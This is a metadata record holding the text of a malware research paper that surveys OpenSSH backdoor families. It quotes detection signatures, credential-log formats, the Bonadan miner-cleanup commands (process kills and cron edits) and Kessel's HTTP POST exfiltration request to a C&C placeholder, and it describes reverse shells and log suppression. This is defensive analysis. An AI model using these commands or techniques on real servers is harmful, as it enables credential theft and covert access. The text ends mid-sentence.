{
    "id": "fed4b89e-61f4-46f3-85ca-e629dbee0ef4",
    "created_at": "2022-10-25T16:48:17.502652Z",
    "updated_at": "2025-03-27T02:16:57.870103Z",
    "deleted_at": null,
    "sha1_hash": "b418f8a762ec974f7ad7a7d02f01d69e0f3db0dc",
    "title": "",
    "authors": "",
    "file_creation_date": "2018-11-29T18:51:04Z",
    "file_modification_date": "2018-11-29T18:51:07Z",
    "file_size": 833613,
    "plain_text": "##### Romain Dumont, Marc-Etienne M.Léveillé, Hugo Porcher\n\n# THE DARK SIDE OF THE FORSSHE\n## A landscape of OpenSSH backdoors\n\n\n-----\n\n### TABLE OF CONTENTS\n\n1. Executive summary .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   5\n\n2. From Windigo to sample collection .   .   .   .   .   .   .   .   .   . 5\n\n2.1 Windigo’s backdoor signatures .   .   .   .   .   .   .   .   .  6\n\n2.2 Let the hunt begin .   .   .   .   .   .   .   .   .   .   .   .   .   7\n\n3. Common features of OpenSSH backdoors .   .   .   .   .   .   .   . 7\n\n3.1 Strings and code obfuscation .  .  .  .  .  .  .  .  .  . 8\n\n3.2 Credential stealing and exfiltration methods .   .   .   .   9\n\n3.3 Backdoor mode .   .   .   .   .   .   .   .   .   .   .   .   .   .  11\n\n4. Exotic planets of the OpenSSH backdoors galaxy .   .   .   .   . 13\n\n4.1 Chandrila  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .  13\n\n4.2 Bonadan .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 13\n\n4.3 Kessel .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  14\n\n4.4 Kamino .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 16\n\n5. Custom honeypot .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 17\n\n5.1 Goals .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 17\n\n5.2 Honeypot structure and strategy .   .   .   .   .   .   .   .  17\n\n5.3 Interactions observed  .   .   .   .   .   .   .   .   .   .   .   . 18\n\n5.4 Discussion and possible improvements .   .   .   .   .   . 20\n\n6. Summary table .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 20\n\n7. Mitigation  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   21\n\n7.1 Preventing compromise of SSH servers .   .   .   .   .   .  21\n\n7.2 How to detect compromised SSH tools  .   .   .   .   .   . 22\n\n8. Conclusion  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .  22\n\n9. References  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .  23\n\n\n-----\n\n10. Analysis of openSSH backdoors .  .  .  .  .  .  .  .  .  .  . 24\n\n10.1 Abafar .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  25\n\n10.2 Akiva .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 27\n\n10.3 Alderaan .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  27\n\n10.4 Ando .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 28\n\n10.5 Anoat .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  29\n\n10.6 Atollon .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 30\n\n10.7 Batuu .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  32\n\n10.8 Bespin .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  32\n\n10.9 Bonadan .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  33\n\n10.10 Borleias  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 34\n\n10.11 Chandrila  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .  34\n\n10.12 Coruscant  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 35\n\n10.13 Crait .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 36\n\n10.14 Endor .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  38\n\n10.15 Jakku .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   40\n\n10.16 Kamino .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 42\n\n10.17 Kessel .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  44\n\n10.18 Mimban .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 45\n\n10.19 Onderon .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  47\n\n10.20 Polis Massa .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  49\n\n10.21 Quarren  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  52\n\n\n-----\n\n### LIST OF FIGURES\n\nFigure 1 _String stacking identification  .   .   .   .   .   .   .   .   .   .   .  8_\n\nFigure 2 _String stacking technique used in a binary .   .   .   .   .   .   .  8_\n\nFigure 3 _Common local credential stealing technique .   .   .   .   .   .   . 10_\n\nFigure 4 _Common email exfiltration technique .   .   .   .   .   .   .   .   . 11_\n\nFigure 5 _Backdoor password verification  .   .   .   .   .   .   .   .   .   .   11_\n\nFigure 6 _DNS exfiltration schema .   .   .   .   .   .   .   .   .   .   .   .   . 16_\n\nFigure 7 _Honepot infrastructure .   .   .   .   .   .   .   .   .   .   .   .   .  17_\n\nFigure 8 _Attackers command captured in the honeypot for Minban component 19_\n\nFigure 9 _OpenSSH backdoor galaxy  .   .   .   .   .   .   .   .   .   .   .   .  24_\n\n### LIST OF TABLES\n\nTable 1 _List of implemented commands of the Kessel component .   .   15_\n\nTable 2. _OpenSSH backdoor family feature grid .   .   .   .   .   .   .   .  20_\n\nTable 3 _Abafar samples configuration .   .   .   .   .   .   .   .   .   .   .  25_\n\nTable 6 _Akiva samples configuration  .   .   .   .   .   .   .   .   .   .   .   27_\n\nTable 4 _Alderaan samples configuration .   .   .   .   .   .   .   .   .   .   28_\n\nTable 7 _Ando samples configuration .   .   .   .   .   .   .   .   .   .   .   . 29_\n\nTable 5 _Anoat samples configuration .   .   .   .   .   .   .   .   .   .   .   30_\n\nTable 8 _Atollon samples configuration .   .   .   .   .   .   .   .   .   .   .  31_\n\nTable 9 _Batuu samples configuration .   .   .   .   .   .   .   .   .   .   .   32_\n\nTable 10 _Bespin samples configuration .   .   .   .   .   .   .   .   .   .   .  33_\n\nTable 11 _Bonadan samples configuration  .   .   .   .   .   .   .   .   .   .   33_\n\nTable 12 _Borleias samples configuration .   .   .   .   .   .   .   .   .   .   . 34_\n\nTable 13 _Chandrila samples configuration .   .   .   .   .   .   .   .   .   .  35_\n\nTable 15 _Coruscant samples configuration .   .   .   .   .   .   .   .   .   .  36_\n\nTable 14 _Crait samples configuration .   .   .   .   .   .   .   .   .   .   .   . 36_\n\nTable 16 _Endor samples configuration .   .   .   .   .   .   .   .   .   .   .   38_\n\nTable 17 _Jakku samples configuration .   .   .   .   .   .   .   .   .   .   .   . 41_\n\nTable 18 _Kamino samples configuration  .   .   .   .   .   .   .   .   .   .   . 43_\n\nTable 19 _Kessel samples configuration  .   .   .   .   .   .   .   .   .   .   .  45_\n\nTable 20 _Mimban samples configuration .   .   .   .   .   .   .   .   .   .   . 46_\n\nTable 21 _Onderon samples configuration  .   .   .   .   .   .   .   .   .   .   48_\n\nTable 22 _Polis Massa samples configuration  .   .   .   .   .   .   .   .   .   50_\n\nTable 23 _Quarren samples configuration .   .   .   .   .   .   .   .   .   .   . 53_\n\n\n-----\n\n### 1. EXECUTIVE SUMMARY\n\nA little more than three years ago we started hunting for OpenSSH backdoors being used in-the-wild.\nWhile we are always trying to improve defenses against Linux malware by discovering and analyzing\nexamples, the scope of this hunt was specifically to catch server-side OpenSSH backdoors. Unfortunately,\ntelemetry on Linux malware is not as readily available as it is on other platforms. Nonetheless, malicious\nOpenSSH binaries are quite common and have features that help us detect them among legitimate\nOpenSSH binaries. While, as soon as we got them, we used the samples collected to improve our detec­\ntion, we only began sorting and analyzing them in 2018. Surprisingly, we discovered many new backdoor\nfamilies that had never been documented before. We tried to gather as much information about each family\nwe uncovered — for example, leaking the credentials, for honeypots we monitor, to the attackers. This paper\nis the result of this research and contains indicators of compromise that could help identify compromised\nservers. Here are the key points from our research:\n\n- [We used knowledge gleaned from our Windigo investigation to extend our coverage](https://www.welivesecurity.com/2014/02/21/an-in-depth-analysis-of-linuxebury/)\n\nof in-the-wild backdoors.\n\n- While there are multiple code bases for the various OpenSSH backdoors, most of them share similar basic\n\nfeatures such as hardcoded credentials to activate a backdoor mode, and credential stealing.\n\n- We grouped all the samples we collected based on their code base and highlighted 21 different OpenSSH\n\nmalware families.\n\n- Out of the 21 families we analyzed, 12 of them were undocumented at the time this paper\n\nwas written (October 2018).\n\n- We have discovered that an SSH backdoor used by DarkLeech operators is the same as that used\n\nby Carbanak a few years later.\n\n- There is a wide spectrum of complexity in backdoor implementation, starting from off-the-shelf malware\n\nto obfuscated samples and network protocols.\n\n- Exfiltration techniques for stolen SSH credentials are creative and include SMTP\n\n(mail sent to malicious operator), HTTP, DNS, and even custom protocols using TCP and UDP.\n\n- OpenSSH backdoors are used both by crimeware and APT groups. Both use malware with similar\n\nsets of features and varying levels of complexity.\n\n### 2. FROM WINDIGO TO SAMPLE COLLECTION\n\nIn March 2014 we released a paper about a large-scale Linux malware operation we named Windigo.\nAt its core was an OpenSSH backdoor and credential stealer that we named Ebury. During this latest\nresearch, we discovered that more than 25,000 servers had been compromised and monetized via web\nredirection and spam.\n\nSince this research started in 2013, we have set up honeypots to capture new Ebury samples,\nto understand how they compromise machines, and track its activity. What we did not discuss in detail\nin our paper – but talked about a bit at conferences – is how the operators deploy Ebury once they capture\nnew credentials. This process is highly automated and uses scripts in Perl, a very portable scripting language,\nto perform the various steps. The compromise process is typically something like:\n\n1. Reconnaissance\n\nA 52 kB Perl script is piped through the SSH session and gathers as much information\nas possible about the system. It performs the following actions:\n\na. Erases logs that malicious SSH sessions may have created.\n\nb. Attempts to detect the presence of a honeypot or whether the session might be monitored, using\n\nnumerous tricks such as the presence of a library loaded using LD_PRELOAD or a ForceCommand\n\noption set in OpenSSH.\n\n\n-----\n\nc. Detects which Linux distribution is used and what version it is.\n\nd. Detects software installed on the system, such as OpenSSH, and their versions.\n\ne. Checks for the presence of files created by OpenSSH backdoors known to the Windigo group.\n\nf. Looks for the presence of an already installed OpenSSH backdoor by searching for byte patterns\n\nin the OpenSSH client (/usr/bin/ssh) and daemon (/usr/sbin/sshd). As of mid-2018, the script\n\ncontains 47 signatures.\n\ng. Steals credentials left on disk by other OpenSSH backdoors.\n\nh. Checks for rootkits by comparing /proc/modules and /sys/module.\n\n2. Ebury installation\n\nIf the system looks interesting to the attacker, another Perl script responsible for deploying Ebury is executed\non the newly-compromised host; this script differs from one Linux distribution and version to another. The\nEbury binary is embedded after Perl’s DATA token. This usually happens several days after the reconnaissance\nscript is run. Package managers’ metadata (debsums, RPM) are altered to make it look legitimate.\n\n3. Monitoring\n\nUsing Ebury’s backdoor, compromised systems are polled daily to set the exfiltration server, gather\ncredentials Ebury collected, and run a shell script to ascertain how the system was used (output of last,\ncontent of .bash_history, etc).\n\n#### 2.1 Windigo’s backdoor signatures\n\nIn all of this, one particularly interesting aspect for us was Windigo’s detection of other OpenSSH backdoors.\nThe first thing we did was to try to find samples, source code, or existing analysis that matched those\nsignatures. Rapidly, we concluded that most of these signatures matched malware that was unknown\nto us and the broader security community. In short, the Windigo operators compromised so many servers\nthat they could collect a bunch of OpenSSH backdoors, learn how to detect them, and steal the credentials\nthat other backdoors were gathering.\n\nHere is an example signature found in a Windigo script:\n\nSimple signature found in Windigo Perl script to detect OpenSSH backdoor (tidied output).\n\n```\n@sd = gs( ‘IN: %s@ \\(%s\\) ‘, ‘-B 2’ );\n@sc = gc( ‘OUT=> %s@%s \\(%s\\)’, ‘-B 1’ );\nif ( $sd[1] =~ m|^/| or $sc[0] =~ m|^/| ) {\n  print\n\n  “mod_sshd29: ‘$sd[0]’:’$sd[1]’:’$sd[2]’\\nmod_sshc29: ‘$sc[0]’:’$sc[1]’\\n”;\n  ssh_ls( $sd[1], $sc[0] );\n}\n\n```\n\nThe script has a number of helper functions to help find the signatures:\n```\n• gs: Same as running the output of GNU strings on the OpenSSH server binary in grep (strings /usr/\n sbin/sshd | grep {pattern}). It has its own Perl implementation of strings and grep\n\n```\nand supports grep’s -A, -B and -C parameters to inspect strings around the matching string.\n```\n• gc: Same as gs but checks the client strings (/usr/bin/ssh).\n• ssh_ls: Print the content of files. Used to steal credentials collected by the detected backdoor.\n\n```\n\n-----\n\nYou may also notice that signatures are numbered. In the example above, mod_sshc29 is the 29th signature\nfor the OpenSSH client (hence the “c”).\n\nOne of the reasons they collect strings around the one that interests them is to find the path where creden­\ntials are written to disk. In this example, the path is the string before the one matching the search string.\n\nMore complex signatures that involve detecting encryption of strings in the samples or credentials written\nto disk are also present. These are implemented in Perl to circumvent the obfuscation.\n\nThere are also more “generic” signatures to catch unknown backdoor families. For example, there is a\nsignature that looks for strings that may be used to disable logging, such as HISTFILE (the environment\nvariable holding the path to the shell’s history file). There are also searches for absolute paths that are not\nusually present in OpenSSH programs.\n\nFinally, the script actually has a whitelist of OpenSSH program hashes that cover the binaries provided\nby popular Linux distributions. The latest version we have at the time of writing is from 2018 and includes\n260 hashes of known-clean OpenSSH builds.\n\n#### 2.2 Let the hunt begin\n\nWe figured we could leverage this script to hunt for the samples described by the signatures, improve\nour own detection, and document the families for which there was currently no published information.\nA Perl script isn’t very useful for hunting purposes so we translated the various signatures into YARA rules.\nWhile some of the signatures could not be translated to YARA directly, we tried our best to create something\nthat would match the samples, even if it meant we would have some false positives. Some fine tuning was\ndone later to reduce their numbers.\n\nThese rules were used to find samples by scanning new files from our various malware sample feeds\nand started collecting them. Quite quickly, we saw new malware families that were as yet undocumented.\nSome of them have C&C servers with domains that have been registered for years.\n\nFor the purpose of this research, we sorted a few hundred samples and grouped them by codebase.\nBy this we mean that two samples sharing the same source code but with different configurations should\nbelong to the same family. Sorting codebases is actually a tedious process, as a family can easily reuse\ncode from another family if it is publicly available: this was the case for Bonadan, for example, which reused\ncode from Onderon. We were able to distinguish 21 families among our sample set. While some of them are\nalready known, others have never been documented and we couldn’t find any references to them\nas distinct families.\n\nLooking across the wide spectrum of samples and families, we were able to draw a global picture\nof in-the-wild OpenSSH backdoors. Mainly, they share a set of common features and accomplish\ntheir goals using similar techniques. This paper includes a global view of those features and techniques,\nand a description of each of the families we analyzed.\n\n### 3. COMMON FEATURES OF OPENSSH BACKDOORS\n\nAmongst the collection of samples we were able to capture, a lot presented similarities and used similar\ntechniques. All of them are the result of modifying and recompiling the original portable OpenSSH source\n(the one used on Linux). A few critical functions are always targeted for modification, such as the ones\nvalidating the credentials of a particular user or the ones used to log the authentication process.\n\nThis section presents an overview of the common features observed in our analysis.\n\n\n-----\n\n#### 3.1 Strings and code obfuscation\n\nNone of the samples we obtained use any complex method of obfuscation. Even though UPX is not an\nobfuscator, it is still worth mentioning that a few of the samples are packed with it. Some attackers made\nthe effort to encrypt useful strings (such as log filenames). The most common way to encrypt strings\nis a simple XOR routine. Despite the fact that string stacking (strings constructed on the stack) is not a\nsophisticated obfuscation method, we have seen quite a lot of binaries using this technique, surely in order\nto bypass simple string searches. That technique is so common that the Windigo operators also noticed\nit. They implemented a basic function to retrieve file paths built using the string stacking technique.\n\n```\n@al = ($bsshd =~/\\xc6\\x45([\\x80-\\xff][\\x00-\\xff])/g); my @r1 = get_stack_strings(\\@al);\n@al = ($bsshd =~/\\xc6\\x44\\x24([\\x00-\\x7f][\\x00-\\xff])|\\xc6\\x84\\x24([\\x00-\\xff][\\x00-\\\nx10]\\x00\\x00[\\x00-\\xff])/g); my @r2 = get_stack_strings(\\@al);\n@al = ($bsshd =~/\\xc6\\x05([\\x00-\\xff]{5})/g); my @r3 = get_stack_strings(\\@al); my @r4 =\nget_strings1(\\@al);\n@sd=(); for (@r1,@r2,@r3,@r4) { push @sd,$_ if /^[0-9a-f]{32}$/ } for (@sd) { print \"mod_\nmd5_sshd1: '$_'\\n\" }\nsub get_stack_strings { my $a=shift; my $to=0; my $ts=''; my @ostr; my %ostr;\nmy @ss = qw{ mkdir var aeiouy bcdfghklmnprstvzx bcdfghklmnprstvz 000 aeiouybcdfg\nhklmnprstv aeiouybcdfghklmnprstvzx klmnprstvzx bcdfg rstvzx bcdfghklmn };\n}\n\n```\n\nFigure 1 // String stacking identification\n\nThis code snippet from the Windigo Perl script shows that they are looking for all instances of the string\nstacking technique in OpenSSH binaries. They built a regular expression containing hex values of the opcodes\ncommonly used while copying the string to memory. There are some legitimate uses of string stacking,\nso they filtered those cases to avoid false positives.\n\nThe following disassembly shows the opcodes of a binary matching the third regex:\n\nFigure 2 // String stacking technique used in a binary\n\n\n-----\n\n#### 3.2 Credential stealing and exfiltration methods\n\nWhen it comes to stealing credentials, various methods are used to collect, store and exfiltrate them.\nMoreover, there are a couple of differences between the ways the trojanized OpenSSH client and daemon\ncollect them.\n\n##### Client vs daemon\n\nBecause the client and the daemon binaries are different, the functions that may be altered are also\ndifferent. Most of these backdoors log the passwords supplied by users.\n\nRegarding the client versions, we observed the following list of functions that are trojanized to steal\npasswords used to log in:\n```\n• userauth_passwd\n• ssh_askpass\n• try_challenge_response_authentication\n• input_userauth_info_req\n• input_userauth_passwd_changereq\n\n```\nNote that not all these functions are modified in each backdoor. The developers of each family choose\nwhatever functions they see fit to alter. Some clients also log the arguments given to the binary in the main\nfunction. In a few rare cases, the function load_identity_file is also trojanized to steal passphrases\nof private key files.\n\nConcerning the daemon versions, we observed the use of the following functions to capture credentials:\n```\n• auth_password\n• sshpam_respond\n• sys_auth_passwd\n• sshpam_auth_passwd\n• server_listen\n\n```\nAs mentioned, only a few families went the extra mile to collect keys. This kind of credential collection will\nbe detailed at the end of the paper in the section Analysis of OpenSSH backdoors.\n\nObviously, collected credentials need to be exfiltrated to the attackers somehow. We have observed three\nways, with varying levels of complexity, that this is accomplished.\n\n##### Exfiltration to local file\n\nCopying the credentials to a local file is the method used by almost all the samples we collected. Most of the\nsamples use only this technique to store stolen credentials, probably because of its ease of implementation.\nObviously, this method also requires the attacker to log back onto the compromised machine to get the file\ncontaining the captured goods. This requires the operators to have a way back into the system, which could\nmean that they compromised the OpenSSH server in addition to the client.\n\nSome backdoors we analyzed use publicly available proof-of-concept code to implement this exfiltration\ntechnique. This shows that some attackers are quite lazy and reuse existing research without improving\ntechniques significantly.\n\nThe path and name of the file storing the credentials are specifically chosen to blend in with the filesystem.\nIndeed, a common pattern we noticed is the use of the directory /usr/include/ or /usr/share/, and\nthe log files have .h extensions, which could appear legitimate to the user. We have also seen the same\nstructure with different directories and file extensions:\n```\n• /usr/lib/ with a filename appended by .so in order to mimic a shared library file\n• /usr/share/man/ with a .gz extension or in a subdirectory of /usr/share/man\n• /tmp/ with various extensions\n• /usr/local/include with a .h extension\n\n```\nSome filenames have a dot prepended to hide the file from a basic directory listing.\n\n\n-----\n\nMoreover, the stolen credentials are sometimes encrypted or encoded before being written to the log\nfile. Among the many methods we have seen, the most common ones consist of applying the NOT\ninstruction to all the bytes, or the use of the SUB instruction with a one-byte key. In some specific cases,\n[we observed the use of symmetric cryptography algorithms to encrypt the log file, such as AES (Atollon),](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)\n_[3DES (Bespin) or RC4+ (Crait).](https://en.wikipedia.org/wiki/Triple_DES)_\n\nThese credentials are written to log files with specific structures defined by their developers. The log file\nstructures we observed are very similar. The most common are:\n```\n• “+user: %s +password: %s\\n” for daemon versions\n• “+host: %s +user: %s +password: %s\\n” for client versions\n• “ssh: ~(av[%d]: %s\\n)” for logging the client’s process arguments\n• “IN: %s at: %s | user: %s, pass: %s\\n” and “OUT” for the client version\n• “user:password -> %s:%s\\n”\n• “passwd from: %s \\tuser: %s \\tpass: %s \\n”\n• “%s:%s\\n” filled with username and password\n\n```\nFigure 3 // Common local credential stealing technique\n\n##### Exfiltration to C&C server\n\nAmongst the 21 backdoor families discussed herein, nine families feature a way to push the credentials\non the network in addition to saving to a local file. Interestingly, those backdoors were also the most\ncomplex ones; not one was based on publicly-available source code. Within those families, we identified\nthe use of the following network protocols to exfiltrate the data:\n\n- HTTP\n\n- Custom protocol over TCP\n\n- Custom protocol over UDP\n\nIn order to be as stealthy as possible, most of the attackers chose some common network ports to commu­\nnicate with the C&C, such as ports 80 (HTTP), 443 (HTTPS) or 1194 (OpenVPN). These ports are commonly\nleft open on network firewalls.\n\nIt should be noted that some backdoors using this kind of exfiltration method implement algorithms\nto encrypt the communication. They generate a symmetric key and encrypt the data with a public key\nhardcoded into the malware and send it alongside the data. This makes it intractable to decrypt\nthe communication without the private key owned by the attackers.\n\nApart from these methods, we also observed the use of DNS exfiltration in one backdoor family, Kessel.\n\n\n-----\n\n##### Exfiltration by email\n\nIn some rare cases (mainly some client backdoors), we observed exfiltration of the contents of the log\nfile (containing the stolen credentials) by email. As shown in the following graphic, the common way\nis simply to pass the contents of the credentials file to the mail command. Of course, this implies that\nthe attacker hardcodes an email address in the binary. We’ve seen this exfiltration method used only\nin the simplest backdoors.\n\nFigure 4 // Common email exfiltration technique\n\n#### 3.3 Backdoor mode\n\nAlong with the ability to steal credentials, the operators also want a permanent method to connect back\nto the compromised machine. To accomplish this, they have included various hardcoded credentials\nthat are checked during SSH authentication.\n\n##### Hardcoded password\n\nThe most popular way to log in is by comparing the client-provided password with a hardcoded password\nin plaintext. We also noticed the use of the crypt and bcrypt functions to hide the plaintext value of the\nbackdoor’s password.\n\nFi 5 // B kd d ifi ti\n\n\n-----\n\nMD5 hashes were seldom found. Some families also use key authentication and hardcode a public key\nthat allows the operators to login with their private key.\n\n##### Tamper daemon configuration\n\nAs well as implementing the backdoor, the malware authors make sure they have root access on the remote\nsystem. The OpenSSH daemon can be configured, via the sshd_config file, so that no root logins are allowed\nand some checks are made in the code to enforce that restriction. The malware developers trojanized those\nfunctions to guarantee they get a root shell. We observed the modification of the following functions:\n```\n• auth_root_allowed\n• do_setusercontext\n• permanently_set_uid\n• getpwnamallow\n• userauth_finish\n\n```\nUsually, a Boolean variable is set while the attacker is logged in, which disables the logging features.\n\n##### Log exclusion\n\nAlong with their backdoor access, the attackers also make sure that they do not leave traces on the system.\n\nEnvironment variables\n\nInside the backdoors, a few modifications are implemented to bypass logging functionality. Typically,\nthe function do_setup_env is modified so the HISTFILE and sometimes the HISTSIZE environment\nvariables are set, respectively, to /dev/null and 0.\n\nHooked logging functions\n\nAs OpenSSH uses a great many functions for logging and debugging, the malware authors modify all\nof them to avoid writing to log files when the malicious actors connect to the compromised host.\nHere is a non-exhaustive list of logging functions that were commonly altered.\n```\n• do_log\n• record_login\n• record_logout\n• auth_log\n• login_write\n• do_pam_session\n• sshpam_cleanup\n• sshpam_auth_passwd\n• log_facility_number\n• debug\n• verbose\n• logit\n• error\n• ssh_userauth2\n\n```\nJust as in the root access enforcement, a Boolean variable is used to change the behavior of the functions.\n\n\n-----\n\n### 4. EXOTIC PLANETS OF THE OPENSSH BACKDOORS GALAXY\n\nAmongst the different families of backdoors we were able to collect, four of them implement some notable\nfeatures that should be described in depth.\n\n#### 4.1 Chandrila\n\nLike the other families detailed in the section Analysis of OpenSSH backdoors, below, this backdoor steals\ncredentials. More precisely, the authentication method used, the username, and the password are recorded\nin a string in the following format, and then base64 encoded.\n\nExfiltration data structure\n```\n“S%s %s:%s”\n\n```\nThe encoded data are either written to a local file or sent to the C&C server on its UDP port 32784.\n\nBesides stealing credentials, this backdoor has the distinctive feature of being able to receive commands\nthrough the SSH password. Basically, two specific passwords are hardcoded into the function validating\nthe authentication. If a user tries to log in using one of these passwords, the data appended to the password\nis interpreted either as a shell command or as an IP address, depending on which password is used. Although\nthe shell command is simply executed on the infected machine, the IP address is used to create a reverse\nshell with the infected host.\n\nThis functionality is quite powerful as it activates the backdoor mode and enables the attacker to execute\ncode remotely, without a shell, in the context of the sshd process.\n\n#### 4.2 Bonadan\n\nInterestingly, this backdoor reuses the credential-stealing module of the Onderon family of backdoors\nas well as implementing a completely new module providing additional backdoor features and a cryptocur­\nrency mining extension.\n\nThis module is started as a new thread in the backdoor’s main function: this thread periodically calls two\nfunctions and pauses for five minutes. The first function executes commands to check whether some known\ncryptocurrency miner is already installed on the system and, if so, removes it.\n\nCleanup of potential cryptocurrency miners already installed on the host\n\n```\nsed -i ‘/curl/d’ /var/spool/cron/root\nsed -i ‘/wget/d’ /var/spool/cron/root\nkillall Circle_MI.png wnTKYg ddg.2011 JN7sb maldet EYgnU ddg.2020\nps -aux|grep -i maldet|awk -F ‘ ‘ ‘{print \\”kill -9 \\” $2}’|sh\nps -aux|grep -i hald-daemon|awk -F ‘ ‘ ‘{print \\”kill -9 \\” $2}’|sh\n\n```\n\nThe second function initializes a connection to the C&C server and sends a bunch of information about\nthe host over UDP:\n\n- the username corresponding to the user running the backdoor\n\n- the OS version\n\n- the external IP address of the infected host\n\n- the CPU model\n\n- the RAM size\n\n- the speed of the miner if it runs\n\n\n-----\n\nData structure sent to initialize the connection to the C&C\n```\n6106#x=%d#%s#user=%s#os=%s#eip=%s#cpu=%s#mem=%s#speed=%s\n\n```\nThis structure is encrypted with an XOR key specified in the configuration and sent directly via UDP\nto port 6152 (default port hardcoded in the configuration) of the C&C. In order to reconstruct the stream,\neach datagram includes a packet number (6106 in the example above) as well as an index (incremented\nfor each packet sent) specified at the beginning of the structure.\n\nOnce the data is sent to the C&C server, the backdoor checks if it is being debugged (difference between two\nsuccessive calls to time) and waits for an answer from the C&C server. Once received, it decrypts the packet\nwith the same key as before and checks if the header is equal to either astra# or 10252#. These two types\nof packets may contain five distinct commands:\n```\n• shell: creates a bind shell on the infected host\n• rshell: creates a reverse shell to the C&C server\n• exe: executes a command on the compromised machine\n• args: updates the configuration of the backdoor (C&C hostname, port, timeout)\n• mine: launches the cryptocurrency mining module\n\n```\nThe first four commands are pretty run-of-the-mill, but the miner module deserves more explanation. First,\nthe backdoor verifies whether the miner is already running: if it isn’t, a new thread is launched to download\nthe miner from the C&C server to /tmp/.abc . To get the appropriate version of the miner for the host OS\nversion, the latter is sent to the C&C before downloading. Finally, the binary is copied to /var/run and /\n```\nusr/share and executed. It mines the Monero cryptocurrency as part of a mining pool. We were not able\n\n```\nto trace the potential transactions of the sample we analyzed as the configuration file was missing.\n\n#### 4.3 Kessel\n\nThis family of OpenSSH backdoors is probably the most advanced we found. It is also the one whose activity\nstarted the most recently, since its C&C server domain has only resolved since August 2018. This backdoor\nincludes two main features: stealing credentials and bot functionality.\n\n##### Bot feature\n\nUnlike the previously documented families, this backdoor comes with a specific configuration hardcoded\nand encrypted (RC4) in the binary. The Katai structure corresponding to the configuration is available on\n[our GitHub IoC repository. At the beginning of the OpenSSH main function, the configuration is decrypted](https://github.com/eset/malware-ioc)\nand set in various global variables. Considerable information is retrieved from the configuration, including\nthe C&C hostname and port, the network protocol that has to be used to communicate with it,\nand the master password and key used for the backdoor mode.\n\nOnce the configuration is set, the bot is initialized following these steps:\n\n1. It generates a bot ID based on the MAC address of the compromised host\n\n2. It collects some system information (architecture, OS version, DNS address, …​)\n\n3. It launches two threads:\n\nd. The first sends an encrypted request periodically to the C&C server containing the information\n\npreviously collected and waits for an answer. The attacker’s server responds with a packet (also\n\nencrypted) containing an IP address and a port, and another thread is then launched to create\n\na reverse shell between the infected host and the machine specified in that response.\n\ne. The other repeatedly queries the custom DNS server on the C&C to get commands through RC4\nencrypted TXT records. Amongst the implemented commands, there is the possibility of uploading/\n\ndownloading a file to/from the compromised machine, executing commands, and updating the rate\n\nof DNS queries to the C&C server.\n\n\n-----\n\nThese two threads are executed only if the corresponding flags are set in the configuration of the backdoor:\nthis way, the behavior of the latter can be altered depending on the compromised system.\n\nThe following table lists all the commands (for each network protocol) implemented in the versions\nof the backdoor that we discovered.\n\n\n_Table 1_ _List of implemented commands of the Kessel component_\n\n\nCommand HTTP Raw TCP DNS (TXT records)\n\n1 Send credentials Send credentials Get command number and arguments\n\n2 Ping Ping Upload a file to the infected host\n\n3 Create SSH tunnel Create SSH tunnel Download a file from the infected host\n\n4 Get SSH tunnel configuration Execute shell command\n\n5 Send error upload or download\n\nUpdate timeout between two requests\n6\nfor a command number\n\n7 Send credentials\n\n8\n\nConfirm the file has been uploaded to the\n9\ninfected host\n\n##### Credential-stealing feature\n\nThis functionality is implemented in pretty much the same way as in the families detailed at the end\nof the document, although many exfiltration protocols can be used, depending on the configuration settings.\n\nIn order to get the plaintext credentials, two legitimate functions are trojanized: ssh_login and user­\n```\nauth_pubkey. They launch a new thread with a command number and the unencrypted data as arguments.\n\n```\nThe first one corresponds to the type of authentication used (password or public key) and the latter to one\nof the following data structures.\n\nPassword structure\n```\n“ssh:%s:%s:%s:%s” (remote host, remote username, password, local username)\n\n```\nPublic key structure\n\n“sshkey:%s:%s:%s:%s:%s” (remote host, remote username, private key filename, private\n```\nkey password, local username)\n\n```\nInterestingly, this is the only backdoor exfiltrating the local username in addition to the remote one\nused to login. The newly created thread encrypts this data structure, puts it into a custom packet structure,\nand sends it to the C&C server using one of the following protocols:\n\n- HTTP: a POST request is simply sent to port 80 of the C&C server. A proxy can be used if it is set\n\nin the configuration. Note that the domain specified in the request’s Host header doesn’t correspond\nto the domain used to resolve the IP address of the C&C server.\n\n  - HTTP POST request (if using proxy)\n```\n   POST http://<C&C>/ HTTP/1.0\n   Host: <FAKE_HOST>\n   Proxy-Connection: keep-alive\n   Content-Length: <DATA_LENGTH>\n   <DATA>\n\n```\n\n-----\n\n- TCP: the data is RC4-encrypted and sent to port TCP/443. It does not encapsulate the data\n\nin either SSL or HTTP.\n\n- DNS: the data is encoded in hexadecimal and sent to the C&C using 